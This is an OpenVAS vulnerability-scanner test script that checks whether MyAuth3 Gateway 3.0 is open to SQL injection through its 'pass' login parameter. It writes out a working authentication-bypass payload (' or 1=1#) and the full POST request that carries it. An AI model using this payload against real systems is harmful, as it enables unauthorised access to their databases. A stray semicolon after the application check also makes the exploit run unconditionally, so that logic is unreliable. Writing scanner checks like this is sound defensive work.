##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_myauth3_gateway_blind_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to view, add, modify or
  delete information in the back-end database.
  Impact Level: Application";
tag_affected = "MyAuth3 Gateway version 3.0";

tag_insight = "The flaw exists due to the error in 'index.php', which fails to sufficiently
  sanitize user-supplied input via 'pass' parameter before using it in SQL
  query.";
tag_solution = "No solution or patch is available as of 09th September, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.tmsoft.com.br/index.php";
tag_summary = "This host is running MyAuth3 Gateway and is prone SQL injection
  vulnerability.";

if(description)
{
  script_id(801980);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-09-09 17:36:48 +0200 (Fri, 09 Sep 2011)");
  script_bugtraq_id(49530);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("MyAuth3 Gateway 'pass' Parameter SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://doie.net/?p=578");
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/16858");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17805/");

  script_description(desc);
  script_summary("Determine SQL injection vulnerability in MyAuth3 Gateway");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 1881);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Check for the default port
myaPort = get_http_port(default:1881);
if(!myaPort){
  myaPort = 1881;
}

## Check the port state
if(!get_port_state(myaPort)){
  exit(0);
}

## request index page
sndReq = http_get(item:"/index.php", port:myaPort);
rcvRes = http_send_recv(port:myaPort, data:sndReq);

## Confirm the Application
if(">MyAuth3 Gateway</" >< rcvRes);
{
  ## Try an exploit
  authVariables ="panel_cmd=auth&r=ok&user=pingpong&pass=%27+or+1%3D1%23";

  ## Construct post request
  sndReq = string("POST /index.php?console=panel HTTP/1.1\r\n",
                   "Host: ", get_host_name(), "\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                   authVariables);
  rcvRes = http_keepalive_send_recv(port:myaPort, data:sndReq);

  ## Check the Response
  if("cotas" >< rcvRes && ">Alterar" >< rcvRes && "senha&" >< rcvRes){
    security_hole(myaPort);
  }
}
